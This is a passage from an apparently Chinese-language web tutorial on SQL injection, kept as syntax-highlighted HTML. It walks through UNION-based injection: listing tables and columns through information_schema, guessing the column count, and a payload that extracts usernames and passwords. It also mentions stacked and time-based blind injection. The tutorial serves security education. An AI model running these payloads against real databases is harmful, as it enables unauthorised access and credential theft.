<div class="crayon-num crayon-striped-num" data-line="crayon-587a9554c3299396108811-2">2</div>
<div class="crayon-num" data-line="crayon-587a9554c3299396108811-3">3</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-587a9554c3299396108811-4">4</div>
<div class="crayon-num" data-line="crayon-587a9554c3299396108811-5">5</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-587a9554c3299396108811-6">6</div>
<div class="crayon-num" data-line="crayon-587a9554c3299396108811-7">7</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-587a9554c3299396108811-8">8</div>
</div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;">
<div class="crayon-line" id="crayon-587a9554c3299396108811-1">
<span class="crayon-v">mysql</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-e">select </span><span class="crayon-e">name </span><span class="crayon-e">from </span><span class="crayon-e">students </span><span class="crayon-e">where </span><span class="crayon-v">id</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-e">union </span><span class="crayon-e">select </span><span class="crayon-e">table_name </span><span class="crayon-e">from </span><span class="crayon-v">information_schema</span><span class="crayon-sy">.</span><span class="crayon-e">tables </span><span class="crayon-e">where </span><span class="crayon-v">table_schema</span><span class="crayon-o">=</span><span class="crayon-s">'t3st'</span><span class="crayon-sy">;</span><span class="crayon-h">    </span><span class="crayon-c">//表名</span>
</div>
<div class="crayon-line crayon-striped-line" id="crayon-587a9554c3299396108811-2">
<span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">+</span>
</div>
<div class="crayon-line" id="crayon-587a9554c3299396108811-3">
<span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-h">     </span><span class="crayon-o">|</span>
</div>
<div class="crayon-line crayon-striped-line" id="crayon-587a9554c3299396108811-4">
<span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">+</span>
</div>
<div class="crayon-line" id="crayon-587a9554c3299396108811-5">
<span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">master</span><span class="crayon-h">   </span><span class="crayon-o">|</span>
</div>
<div class="crayon-line crayon-striped-line" id="crayon-587a9554c3299396108811-6">
<span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">students</span><span class="crayon-h"> </span><span class="crayon-o">|</span>
</div>
<div class="crayon-line" id="crayon-587a9554c3299396108811-7">
<span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">+</span>
</div>
<div class="crayon-line crayon-striped-line" id="crayon-587a9554c3299396108811-8">
<span class="crayon-cn">2</span><span class="crayon-h">   </span><span class="crayon-e">rows </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-e">set</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-cn">0.00</span><span class="crayon-h"> </span><span class="crayon-v">sec</span><span class="crayon-sy">)</span>
</div>
</div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0019 seconds] -->
<p>3)</p>
<!-- Crayon Syntax Highlighter v2.7.1.1 -->

		<div id="crayon-587a9554c329c620864622" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate" data-settings=" minimize scroll-always" style=" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" show" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;">
<span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;">
<div class="crayon-button crayon-nums-button" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div>
</div>
</div>
			<div class="crayon-info" style="min-height: 18.2px !important; line-height: 18.2px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;">
mysql&gt; select name from students where id = -1 union select column_name from information_schema.columns where table_name = 'students' ;     //列名
+------+
| name |
+------+
| id   |
| name |
| age  |
+------+
3 rows in set (0.00 sec)</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 13px !important; line-height: 15px !important;">
<div class="crayon-num" data-line="crayon-587a9554c329c620864622-1">1</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-587a9554c329c620864622-2">2</div>
<div class="crayon-num" data-line="crayon-587a9554c329c620864622-3">3</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-587a9554c329c620864622-4">4</div>
<div class="crayon-num" data-line="crayon-587a9554c329c620864622-5">5</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-587a9554c329c620864622-6">6</div>
<div class="crayon-num" data-line="crayon-587a9554c329c620864622-7">7</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-587a9554c329c620864622-8">8</div>
<div class="crayon-num" data-line="crayon-587a9554c329c620864622-9">9</div>
</div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;">
<div class="crayon-line" id="crayon-587a9554c329c620864622-1">
<span class="crayon-v">mysql</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-e">select </span><span class="crayon-e">name </span><span class="crayon-e">from </span><span class="crayon-e">students </span><span class="crayon-e">where </span><span class="crayon-v">id</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-e">union </span><span class="crayon-e">select </span><span class="crayon-e">column_name </span><span class="crayon-e">from </span><span class="crayon-v">information_schema</span><span class="crayon-sy">.</span><span class="crayon-e">columns </span><span class="crayon-e">where </span><span class="crayon-v">table_name</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'students'</span><span class="crayon-h"> </span><span class="crayon-sy">;</span><span class="crayon-h">     </span><span class="crayon-c">//列名</span>
</div>
<div class="crayon-line crayon-striped-line" id="crayon-587a9554c329c620864622-2">
<span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">+</span>
</div>
<div class="crayon-line" id="crayon-587a9554c329c620864622-3">
<span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-h"> </span><span class="crayon-o">|</span>
</div>
<div class="crayon-line crayon-striped-line" id="crayon-587a9554c329c620864622-4">
<span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">+</span>
</div>
<div class="crayon-line" id="crayon-587a9554c329c620864622-5">
<span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">id</span><span class="crayon-h">   </span><span class="crayon-o">|</span>
</div>
<div class="crayon-line crayon-striped-line" id="crayon-587a9554c329c620864622-6">
<span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-h"> </span><span class="crayon-o">|</span>
</div>
<div class="crayon-line" id="crayon-587a9554c329c620864622-7">
<span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">age</span><span class="crayon-h">  </span><span class="crayon-o">|</span>
</div>
<div class="crayon-line crayon-striped-line" id="crayon-587a9554c329c620864622-8">
<span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">+</span>
</div>
<div class="crayon-line" id="crayon-587a9554c329c620864622-9">
<span class="crayon-cn">3</span><span class="crayon-h"> </span><span class="crayon-e">rows </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-e">set</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-cn">0.00</span><span class="crayon-h"> </span><span class="crayon-v">sec</span><span class="crayon-sy">)</span>
</div>
</div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0019 seconds] -->
<p>UNION 操作符用于合并两个或多个 SELECT 语句的结果集。<strong>请注意，UNION 内部的 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的列的顺序必须相同。</strong></p>
<p>举个例子，还以最开始的 OWASP 为基础，返回了两个值分别是 first_name 和 sur_name，可想而知，服务器在返回数据库的查询结果时，就会把结果中的第一个值和第二个值传给 first_name 和 sur_name，多了或少了，都会引起报错。</p>
<p>所以你如果想要使用union查询来进行注入，你首先要猜测后端查询语句中查询了多少列，哪些列可以回显给用户。</p>
<p>猜测列数</p>
<!-- Crayon Syntax Highlighter v2.7.1.1 -->

		<div id="crayon-587a9554c329f246090212" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate" data-settings=" minimize scroll-always" style=" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" show" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;">
<span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;">
<div class="crayon-button crayon-nums-button" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div>
</div>
</div>
			<div class="crayon-info" style="min-height: 18.2px !important; line-height: 18.2px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;">
-1 union select 1
-1 union select 1,2
-1 union select 1,2,3
//直到页面正常显示</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 13px !important; line-height: 15px !important;">
<div class="crayon-num" data-line="crayon-587a9554c329f246090212-1">1</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-587a9554c329f246090212-2">2</div>
<div class="crayon-num" data-line="crayon-587a9554c329f246090212-3">3</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-587a9554c329f246090212-4">4</div>
</div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;">
<div class="crayon-line" id="crayon-587a9554c329f246090212-1">
<span class="crayon-o">-</span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-e">union </span><span class="crayon-i">select</span><span class="crayon-h"> </span><span class="crayon-cn">1</span>
</div>
<div class="crayon-line crayon-striped-line" id="crayon-587a9554c329f246090212-2">
<span class="crayon-o">-</span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-e">union </span><span class="crayon-i">select</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">,</span><span class="crayon-cn">2</span>
</div>
<div class="crayon-line" id="crayon-587a9554c329f246090212-3">
<span class="crayon-o">-</span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-e">union </span><span class="crayon-i">select</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">,</span><span class="crayon-cn">2</span><span class="crayon-sy">,</span><span class="crayon-cn">3</span>
</div>
<div class="crayon-line crayon-striped-line" id="crayon-587a9554c329f246090212-4"><span class="crayon-c">//直到页面正常显示</span></div>
</div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0009 seconds] -->
<p>比如这条语句</p>
<!-- Crayon Syntax Highlighter v2.7.1.1 -->

		<div id="crayon-587a9554c32a2211245129" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate" data-settings=" minimize scroll-always" style=" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" show" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;">
<span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;">
<div class="crayon-button crayon-nums-button" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div>
</div>
</div>
			<div class="crayon-info" style="min-height: 18.2px !important; line-height: 18.2px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;">
-1 UNION SELECT 1,2,3,4</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 13px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-587a9554c32a2211245129-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-587a9554c32a2211245129-1">
<span class="crayon-o">-</span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-e">UNION </span><span class="crayon-i">SELECT</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">,</span><span class="crayon-cn">2</span><span class="crayon-sy">,</span><span class="crayon-cn">3</span><span class="crayon-sy">,</span><span class="crayon-cn">4</span>
</div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0005 seconds] -->
<p>如果显示的值为3和4，表示该查询结果中有四列，并且第三列和第四列是有用的。则相应的构造union语句如下</p>
<!-- Crayon Syntax Highlighter v2.7.1.1 -->

		<div id="crayon-587a9554c32b1409307383" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate" data-settings=" minimize scroll-always" style=" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" show" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;">
<span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;">
<div class="crayon-button crayon-nums-button" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div>
</div>
</div>
			<div class="crayon-info" style="min-height: 18.2px !important; line-height: 18.2px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;">
-1 UNION SELECT 1,2,username,password FROM table</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 13px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-587a9554c32b1409307383-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-587a9554c32b1409307383-1">
<span class="crayon-o">-</span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-e">UNION </span><span class="crayon-i">SELECT</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">,</span><span class="crayon-cn">2</span><span class="crayon-sy">,</span><span class="crayon-v">username</span><span class="crayon-sy">,</span><span class="crayon-e">password </span><span class="crayon-e">FROM </span><span class="crayon-v">table</span>
</div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0006 seconds] -->
<p></p>
<h2 id="小结一下">小结一下</h2>
<p>SQL 注入大概有5种，还有两种分别是 Stacked_queries(基于堆栈)和 Time-based blind(时间延迟)，堆栈就是多语句查询，用 ‘;’ 把语句隔开，和 union 一样；时间延迟就是利用 sleep() 函数让数据库延迟执行，偷数据的速度很慢。(还有一个第六种，内联注入，但和前面涉及的内容有所重叠，就不单独来讨论了)</p>

</div>

        
        
        
    <div class="post-adds">
        <span data-post-id="109784" class=" btn-bluet-bigger href-style vote-post-up   register-user-only "><i class="fa  fa-thumbs-o-up"></i> <h10 id="109784votetotal">2</h10> 赞</span>
        <span data-book-type="1" data-site-id="2" data-item-id="109784" data-item-type="1" class=" btn-bluet-bigger href-style bookmark-btn  register-user-only "><i class="fa fa-bookmark-o  "></i> 2 收藏</span>

                    <a href="#article-comment"><span class="btn-bluet-bigger href-style hide-on-480"><i class="fa fa-comments-o"></i> 1 评论</span></a>
        
        
        
        <!-- JiaThis Button BEGIN -->
        <div class="jiathis_style_24x24" style="display: inline-flex; position: relative; margin: 0; clear: both;float: right;">
            <a class="jiathis_button_tsina"></a>
            <a class="jiathis_button_weixin"></a>
            <a class="jiathis_button_qzone"></a>
            <a class="jiathis_button_fb hide-on-480"></a>
            <a href="http://www.jiathis.com/share?uid=1745061" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
        </div>

    </div>




        <!-- BEGIN #author-bio -->


<!-- END #author-bio -->
	
{% endraw %}
